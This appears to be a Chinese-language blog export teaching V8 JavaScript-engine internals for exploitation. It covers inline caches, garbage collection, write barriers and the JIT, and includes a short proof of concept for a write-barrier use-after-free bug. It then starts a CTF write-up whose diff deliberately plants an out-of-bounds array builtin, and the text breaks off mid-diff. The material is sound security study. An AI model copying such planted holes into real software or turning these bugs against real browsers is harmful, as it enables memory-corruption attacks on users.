title="polymorphic（多态）"></a>polymorphic（多态）</h3><p>简单来说就是上面的getSloth函数被多次调用，但每次传入的obj的properties都和上次不一致（对标2-4个Map的情况），下面的例子是map1-&gt;map2-&gt;map1-&gt;map2，那么就要生成一系列的map check比较，以判断选择哪个map的Inline Cache</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123;sloth : <span class="number">1440</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="attr">passion</span>:<span class="number">1</span>, sloth : <span class="number">1440</span>&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getSloth</span>(<span class="params">obj</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> obj.<span class="property">sloth</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100000</span>;i++)&#123;<span class="comment">//触发inline Cache &amp; JIT</span></span><br><span class="line"><span class="title function_">getSloth</span>(o);</span><br><span class="line"><span class="title function_">getSloth</span>(o1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>生成的汇编逻辑类似</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    mov ecx, &quot;sloth&quot;</span><br><span class="line">    mov eax, obj</span><br><span class="line">    call IC_Polymorphic_sloth</span><br><span class="line"></span><br><span class="line">IC_Monomorphic_sloth: #单态情况</span><br><span class="line">    cmp [eax], &lt;map&gt;</span><br><span class="line">    jne miss</span><br><span class="line">    mov eax, [eax + 4]</span><br><span class="line">    mov eax, [eax + &lt;sloth_offset&gt;]</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">miss:</span><br><span class="line">    jmp IC_Miss</span><br><span class="line"></span><br><span class="line">IC_Polymorphic_sloth: #多态情况</span><br><span class="line">    cmp [eax], &lt;map1&gt; #先比较map1</span><br><span class="line">    jne check2</span><br><span class="line">    mov eax, [eax + 4] #32位下property对应的偏移</span><br><span class="line">    mov eax, [eax + &lt;sloth_offset1&gt;] </span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">check2:</span><br><span class="line">    cmp [eax], &lt;map2&gt; #再比较map2</span><br><span class="line">    jne miss</span><br><span class="line">    mov eax, [eax + 4]</span><br><span class="line">    mov eax, [eax + &lt;sloth_offset2&gt;]</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">miss:</span><br><span class="line">    jmp IC_Miss</span><br></pre></td></tr></table></figure></div><h3 id="Megamorphic（超态）"><a href="#Megamorphic（超态）" class="headerlink" title="Megamorphic（超态）"></a>Megamorphic（超态）</h3><p>超过了4个Map（或引擎设计的多态缓存的容量），V8懒得管理了，此时缓存机制切换为通用查找，而非特定类型优化</p><h3 id="一些特殊情况——访问一个继承的property"><a href="#一些特殊情况——访问一个继承的property" class="headerlink" title="一些特殊情况——访问一个继承的property"></a>一些特殊情况——访问一个继承的property</h3><p>术语补充：</p><ul><li><strong>Receiver</strong> 是执行属性访问或方法调用时，实际的目标对象</li><li><strong>Holder</strong> 是实际存储目标属性的对象。它表示属性访问时的查找终点</li></ul><p>举个例子，下面的js code中，以访问<code>obj2.X</code>为例，<strong>实际进⾏属性访问的对象</strong>obj2是receiver<strong>，⽽真正持有属性</strong>X的对象obj<strong>是</strong>holder<strong>。</strong></p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;X : <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> obj1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;&#125;;</span><br><span class="line">obj2.<span class="property">__proto__</span> = obj1;</span><br><span class="line">obj1.<span class="property">__proto__</span> = obj;</span><br><span class="line"><span class="title function_">print</span>(obj2.<span class="property">X</span>);</span><br><span class="line"><span class="comment">//output： 1</span></span><br><span class="line"><span class="comment">//protochain：obj-&gt;obj1-&gt;obj2</span></span><br></pre></td></tr></table></figure></div><blockquote><p>💡学过Web的js原型连污染的应该对这个很熟悉了，js中可以通过设置对象的 <code>__proto__</code> 属性来动态调整对象的原型链，从而设置或更改一个对象的“父对象”（即它的原型对象）。</p><p>因此如果访问obj2的X属性，实际上需要顺着obj2的原型链向上一直找到obj这个holder，而inline Cache也得遵循这个逻辑，所以<u>obj2的inline Cache必须沿着protochain，对链上的每个map都进⾏check。</u></p></blockquote><h3 id="Inline-Cache相关CVE"><a href="#Inline-Cache相关CVE" class="headerlink" title="Inline Cache相关CVE"></a>Inline Cache相关CVE</h3><p>CVE-2022-1134</p><p><a class="link"   href="https://github.blog/2022-06-29-the-chromium-super-inline-cache-type-confusion/" >https://github.blog/2022-06-29-the-chromium-super-inline-cache-type-confusion/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>CVE-2021-38001</p><p><a class="link"   href="https://bugs.chromium.org/p/chromium/issues/detail?id=1260577" >https://bugs.chromium.org/p/chromium/issues/detail?id=1260577 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://github.com/vngkv123/articles/blob/main/CVE-2021-38001.md" >https://github.com/vngkv123/articles/blob/main/CVE-2021-38001.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>漏洞根因：Inline Cache的处理程序（也就是IC Handler）在创建时会基于某些假设（例如对象结构Map、原型链状态等）生成优化的代码，因此有机会造成一些类型混淆漏洞。（JIT中也有类似）</p><p>🧠TODO：先挖个坑，后面有时间再进行调试分析</p><h2 id="0x01-垃圾回收-GC-🗑️"><a href="#0x01-垃圾回收-GC-🗑️" class="headerlink" title="0x01 垃圾回收(GC)🗑️"></a>0x01 垃圾回收(GC)🗑️</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>V8中的垃圾回收（GC）与Java的GC类似，都是通过自动内存管理来回收不再使用的对象（也就是HeapObject）。</p><blockquote><p>相较于传统的<code>glibc</code>中的heap管理方式（malloc、free）不一样，V8使⽤mmap来拓展堆空间</p></blockquote><h3 id="GC空间划分"><a href="#GC空间划分" class="headerlink" title="GC空间划分"></a>GC空间划分</h3><p>主要是3块</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">  A[&quot;Young Generation&quot;] </span><br><span class="line">  B[&quot;Old Generation&quot;]</span><br><span class="line">  C[&quot;Other&quot;] </span><br></pre></td></tr></table></figure></div><blockquote><p>根据Object的存活时间，分为Young&#x2F;Old Generation，除此之外的Other区域不属于任何一个Generation，老版本中Other区域其实是Large Object Space，放一些大小超过一定阈值的Object</p></blockquote><h3 id="Young-Generation"><a href="#Young-Generation" class="headerlink" title="Young Generation"></a>Young Generation</h3><p>结构如下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[Young Generation] --&gt; B[New Space]</span><br><span class="line">    B --&gt; C[To Space]</span><br><span class="line">    B --&gt; D[From Space]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li><p>New Space</p><ul><li>新创建的object都会被放入这里面（除了code object，map object和large object）并受GC管理</li></ul></li><li><p>这块区域使用的GC算法是Cheney’s algorithm（<strong>实际上是Cheney’s GC复制算法的改版，From&#x2F;To Space的功能和原版不一样，源码里相关函数叫Scavenge</strong>），需要使用到To Space和From Space，其实这个算法很好理解：</p><ul><li><p>每一个新创建的Object最开始都会被放入To Space </p></li><li><p>假设出现memory exhaustion（空间耗尽）：To Space已经满了，现在新创建了一个object-sloth，To Space内部如下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">To: obj-a | obj-b | obj-c | ... | obj-end |        </span><br><span class="line">From: Empty</span><br></pre></td></tr></table></figure></div></li><li><p>显然To Space放不下了，因此把To Space的内容和From Space交换(因为From Space是空的，相当于清空ToSpace)，然后在From Space中依次判断每个Object是否存活，比如：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">To: Empty</span><br><span class="line">From: obj-a(alive,root) | obj-b(dead❌) | obj-c(alive,noroot) | ... | obj-end(alive) | </span><br></pre></td></tr></table></figure></div></li><li><p>把From Space中alive的Object复制到To Space中，清空From space，然后再重新分配刚刚创建的obj-sloth</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">To: obj-a | obj-c | ... | obj-end | obj-sloth |     </span><br><span class="line">From: Empty</span><br></pre></td></tr></table></figure></div></li></ul></li></ul><blockquote><p>怎么判断object是否是alive？🤔</p><ul><li>首先root objects肯定是alive的，主要包括global objects, built-in objects, local objects within the scope of living等</li><li>从Old Space（这块在Old Generation中，后面会提到）中可以访问的object也是alive的</li></ul></blockquote><h3 id="Old-Generation"><a href="#Old-Generation" class="headerlink" title="Old Generation"></a>Old Generation</h3><p>结构如下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[Old Generation] --&gt; B[Old Space]</span><br><span class="line">    A --&gt; C[Code Space]</span><br><span class="line">    A --&gt; D[Map Space]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li><p>Old Space主要用来存放长期alive的Object</p><ul><li>在Young Generation的New Space中，经过两次GC仍保留的object就会存到old space中</li><li>old space发生GC的频率比new space小很多，因此后面构造exp的时候用于内存布局的object可以先放到old space中（之前写*CTF oob exp中先进行两次GC的原因）</li></ul></li><li><p>Code Space</p><ul><li>主要是放code object的，<strong>Code Object</strong> 是 V8 中用于存储<strong>生成的机器代码</strong>的数据结构</li><li>可能新手看到这里会有疑问🤔，为什么V8要设计一个存储机器代码的object，这个主要涉及JIT优化，V8会将JavaScript函数（一般是hot code）编译为字节码，优化为机器码后（JIT优化），这些代码片段会被存储为 Code Object，之后再遇到该函数调用可以直接运行机器码，速度更快。</li><li>这里面的code object主要是JIT优化产生的，由于是JIT优化都是运行时的，所以对应的code object所在内存区域也需要有<strong>rwx权限</strong></li></ul></li><li><p>Map Space</p><ul><li>Map Object就是之前提到的Hidden Class(Map)</li></ul></li></ul><blockquote><p>Old generation中GC使用的是Mark-Sweep-Compact算法，但后续利用中不涉及，感兴趣可以看</p><p><a class="link"   href="https://fa1lr4in.com/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/" >https://fa1lr4in.com/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><p>里面是一个Large Object Space，放600KB及以上的object</p><blockquote><p>这些Large Object有以下特点</p><ul><li>不是通过Heap分配的，而是mmap直接分配的</li><li>内存位置是固定的，在垃圾回收（GC）过程中，普通Object可能会被复制或移动到新的内存位置以进行整理，而Large Object由于体积庞大，因此它们<strong>不参与移动</strong>。</li><li>如果 Large Object Space 中需要存放多个对象，这些内存块会使用链表进行管理</li></ul></blockquote><h3 id="Write-Barrier-amp-Remember-Set"><a href="#Write-Barrier-amp-Remember-Set" class="headerlink" title="Write Barrier &amp; Remember Set"></a>Write Barrier &amp; Remember Set</h3><p>🤔想象这样一种情况，我们已经知道Old Generation中放的是长期存活的Object(为了方便，后面就称这类object为<code>old-obj</code>)，但如果我们现在触发了GC，需要回收在Young Generation的一个<code>young-obj</code>，而恰好有一个<code>old-obj</code>引用了这个<code>young-obj</code>。</p><p>那么为了防止悬挂指针(Dangling Pointer)，也就是<code>young-obj</code>已经被回收了，而那个<code>old-obj</code>的引用指针仍然指向已被清理的内存空间，因此需要更新<code>old-obj</code>的引用指针。</p><blockquote><p>🧠这里可能有个疑问，Old Generation中不都是经过2轮GC存活下来的object吗，怎么还会指向新创建的在Young Generation中的新object，这里其实就是一个<strong>跨代引用</strong></p><h4 id="跨代引用"><a href="#跨代引用" class="headerlink" title="跨代引用"></a>跨代引用</h4><p>在 JavaScript 程序中，运行时可能会修改对象的属性或结构，导致 Old Generation 的对象持有 Young Generation 的引用。例如：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oldObj = &#123;&#125;; </span><br><span class="line"><span class="comment">//....some code 导致 oldObj 最终被提升到 Old Generation</span></span><br><span class="line"><span class="keyword">let</span> youngObj = &#123; <span class="attr">key</span>: <span class="string">&#x27;value&#x27;</span> &#125;; <span class="comment">// youngObj 位于 Young Generation</span></span><br><span class="line">oldObj.<span class="property">ref</span> = youngObj; <span class="comment">// Old Generation 的对象引用了 Young Generation 的对象</span></span><br></pre></td></tr></table></figure></div></blockquote><p>除了回收这个<code>young-obj</code>的情况需要更新对应<code>old-obj</code>的引用指针外，其实只要发生GC，也可能移动这个<code>young-obj</code>(可能是简单的From-&gt;To，也可能是发生了”晋升”)，导致改变其实际内存地址。</p><blockquote><p>💡”晋升”🔝是指在Young Generation中的<code>young-obj</code>经历过的GC轮数达到设定的阈值，可以被认为是长期存活的object，因此移入Old Generation</p></blockquote><p>那么针对上面说的这类现象，我们在对Young Generation进行GC回收对象时，还需要访问Old Generation来更新<code>old-obj</code>的引用指针，这似乎违背了这种分代设计的初衷，🤔之所以要分成Young Generation和Old Generation就是为了减少object的扫描次数从而加快GC效率，因此为了解决跨代引用更新的问题，引入了一个叫记录集(Remember Set)的概念。</p><p>什么是记录集？可以简单理解为，记录集内记录了所有<code>old-obj</code>指向<code>young-obj</code>的情况，具体实现中记录集内就是一组指向有跨代引用的<code>old-obj</code>的指针。因此我们在对Young Generation进行GC时，可以通过访问记录集来快速修改引用情况，下图是一个更新跨代引用的示例(同时发生了<code>young-obj</code>的”晋升”🔝)</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241117175832676.png"                      alt="image-20241117175832676"                ><figcaption>image-20241117175832676</figcaption></figure></p><p>我们也可以用下面的流程图来表示这个过程</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[触发新生代GC] --&gt; B[扫描记录集]</span><br><span class="line">    B --&gt; C[将记录集中的老年代对象作为根对象]</span><br><span class="line">    C --&gt; D[检查老年代对象引用的新生代对象]</span><br><span class="line">    D --&gt; E&#123;目标对象存活状态&#125;</span><br><span class="line">    </span><br><span class="line">    E --&gt;|存活| F[复制到新生代的To-Space]</span><br><span class="line">    E --&gt;|已晋升| G[更新到老年代]</span><br><span class="line">    E --&gt;|未存活| H[回收目标对象]</span><br><span class="line">    </span><br><span class="line">    F --&gt; I[更新老年代对象的引用指针]</span><br><span class="line">    H --&gt; I</span><br><span class="line">    G --&gt; I</span><br><span class="line">    I --&gt; J[完成引用关系更新]</span><br><span class="line">    J --&gt; K[回收新生代的未引用对象]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>🤓👆🏻那么现在还有一个问题，我们该怎么形成这个记录集🤔，这里就又要引入一个写入屏障(Write Barrier)的概念，在更新对象间的指针时候(发生引用关系变化，比如执行<code>obj.x=...</code>)，就会触发write_barrier，其实现的代码逻辑如下</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">write_barrier</span>(obj, field, new_obj)&#123;</span><br><span class="line"><span class="keyword">if</span>(obj &gt;= $old_start &amp;&amp; new_obj &lt; $old_start &amp;&amp; obj.remembered == FALSE)&#123;</span><br><span class="line">    $rs[$rs_index] = obj</span><br><span class="line">    $rs_index++</span><br><span class="line">    obj.remembered = TRUE</span><br><span class="line">  &#125;</span><br><span class="line">  *field = new_obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>参数 obj 是发出引⽤的对象，obj 内存在要更新的指针，⽽ field 指的就是 obj 内的域，new_obj 是在指针更新后成为引⽤⽬标的对象。</p><p>三个判断条件</p><ul><li>发出引⽤的对象是不是<code>old-obj</code></li><li>指针更新后的引⽤的⽬标对象是不是<code>young-obj</code></li><li>发出引⽤的对象是否还没有被记录到记录集中</li></ul><p>如果这些条件都满⾜，就将<code>old-obj</code>写⼊到记录集⾥，最后<code>*field = new_obj</code>更新指针</p><p>💡这里可以发现这个指针更新的操作是一定发生的(在if条件外)，因此有个比较典型的漏洞，<strong>在更新指针的时候，错误的消除了</strong>Write Barrier，即只更新指针，不检查是否该把<code>old-obj</code>写⼊到记录集⾥（这样就会导致后面发生GC时不更新这个<code>old-obj</code>的引用关系，发生UAF）。</p><p><a class="link"   href="https://bugs.chromium.org/p/chromium/issues/detail?id=791245" >https://bugs.chromium.org/p/chromium/issues/detail?id=791245 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>其实就是JIT的锅，因为V8中Object还有smi的存在，所以JIT认为smi不用写屏障(因为它就没有property，也不能进行<code>obj.x=...</code>的操作)</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> v; <span class="comment">// should be var</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">700000</span>; i++) &#123;</span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    v = i + -<span class="number">0</span>;</span><br><span class="line">    arr[<span class="number">0</span>] = v;<span class="comment">//更新arr这个obj的引用关系，但是JIT把这里的写屏障消除了</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">print</span>(arr[<span class="number">0</span>] === v) <span class="comment">// true</span></span><br><span class="line"><span class="title function_">gc</span>();<span class="comment">//gc之后arr[0]-&gt;v的引用丢失了，原来指的那个v已经被移动了，但没更新arr对v的引用</span></span><br><span class="line"><span class="title function_">print</span>(arr[<span class="number">0</span>] === v) <span class="comment">// false</span></span><br></pre></td></tr></table></figure></div></blockquote><h2 id="0x02-编译优化⏩"><a href="#0x02-编译优化⏩" class="headerlink" title="0x02 编译优化⏩"></a>0x02 编译优化⏩</h2><h3 id="JIT概述"><a href="#JIT概述" class="headerlink" title="JIT概述"></a>JIT概述</h3><p>参考<a class="link"   href="https://hacks.mozilla.org/2017/02/a-crash-course-in-just-in-time-jit-compilers/" >https://hacks.mozilla.org/2017/02/a-crash-course-in-just-in-time-jit-compilers/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 以类型保护为例，V8中Js code的执行流程图类似下图</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[JavaScript Source Code] --&gt; C[Abstract Syntax Tree]</span><br><span class="line">    C --&gt; D[Interpreter Ignition]</span><br><span class="line">    E[&quot;Compiler TurboFan(JIT)🌟&quot;]</span><br><span class="line">    D --&gt; F[Bytecode]</span><br><span class="line">    E --&gt; G[Optimized Machine Code]</span><br><span class="line">    D -.-&gt; E</span><br><span class="line">    G -.-&gt; F</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>js是动态类型语言，变量只有在运行时才能确定类型，因此需要做很多类型检查(如下图)，JIT会参与其中的优化。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241117175902132.png"                      alt="image-20241117175902132"                ><figcaption>image-20241117175902132</figcaption></figure></p><h4 id="什么时候优化？"><a href="#什么时候优化？" class="headerlink" title="什么时候优化？"></a>什么时候优化？</h4><p>当某行代码被重复执行(或执行次数达到一定阈值)后，代码会被传给JIT compiler进行优化。</p><h4 id="怎么优化？"><a href="#怎么优化？" class="headerlink" title="怎么优化？"></a>怎么优化？</h4><p>JIT会对这些变量的类型做出假设，删除冗余的类型检查，只保留与假设对应的，同时也上了“保险🔒”（类型保护），假设不成立的话就打回到优化前的版本（可能是解释器&#x2F;其他baseline compiler）</p><h4 id="怎么做合理的假设？"><a href="#怎么做合理的假设？" class="headerlink" title="怎么做合理的假设？"></a>怎么做合理的假设？</h4><p>与“概率”有关，JIT通过对<strong>多次执行的代码的编译结果的存储，来实现对变量类型的合理推测</strong>，原文⬇️</p><blockquote><p>The optimizing compiler <strong>uses the information the monitor has gathered by watching code execution to make these judgments</strong>. If something has been true for all previous passes through a loop, it assumes it will continue to be true.</p></blockquote><p>🤔也许使用循环可能可以“欺骗”JIT做出一些优化，我猜测FuzzJIT(Security’23)的作者灵感也来源于此。</p><h3 id="TurboFan-Pipeline（V8中的JIT-承担主要的编译优化工作）"><a href="#TurboFan-Pipeline（V8中的JIT-承担主要的编译优化工作）" class="headerlink" title="TurboFan Pipeline（V8中的JIT 承担主要的编译优化工作）"></a>TurboFan Pipeline（V8中的JIT 承担主要的编译优化工作）</h3><p>如下图</p><ul><li>首先构造AST、Bytecode，然后inline它们的JavaScript Graph</li><li>简化得到的Graph，同时进行一个静态的类型分析，包括类型推断等</li><li>进行类型优化，再简化Graph</li><li>再进行一些其他优化（比如冗余节点消除、循环不变量外提等）</li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241117175913086.png"                      alt="image-20241117175913086"                ><figcaption>image-20241117175913086</figcaption></figure></p><h3 id="Turbolizer"><a href="#Turbolizer" class="headerlink" title="Turbolizer"></a>Turbolizer</h3><p>V8的IR是一种图IR，这个工具可以将其可视化</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241117175920222.png"                      alt="image-20241117175920222"                ><figcaption>image-20241117175920222</figcaption></figure></p><p>V8的图IR结合的控制流与数据流，有多种edge</p><ul><li><p>value edges，比如可以表示函数传参关系，类似数据流分析中DFG的edge</p></li><li><p>control edges，类似控制流分析中CFG的edge</p></li><li><p>effect edges比较特殊，表示“副作用”，以下图为例，虚线部分就是之前说的inline Cache，在检查是否可以命中缓存中的Map</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241117175928650.png"                      alt="image-20241117175928650"                ><figcaption>image-20241117175928650</figcaption></figure></p></li></ul><blockquote><p>副作用操作（如内存读写）之间可能有依赖关系。Effect Edges 表示这些依赖，帮助编译器识别哪些操作可以重排、哪些不能。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js-engine </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V8-pwn入门(2)——[*CTF]oob</title>
      <link href="/2024/11/14/V8-pwn%E5%85%A5%E9%97%A8-2-%E2%80%94%E2%80%94-CTF-oob/"/>
      <url>/2024/11/14/V8-pwn%E5%85%A5%E9%97%A8-2-%E2%80%94%E2%80%94-CTF-oob/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-环境配置🔧"><a href="#0x00-环境配置🔧" class="headerlink" title="0x00 环境配置🔧"></a>0x00 环境配置🔧</h2><h3 id="oob-diff"><a href="#oob-diff" class="headerlink" title="oob.diff"></a>oob.diff</h3><div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span 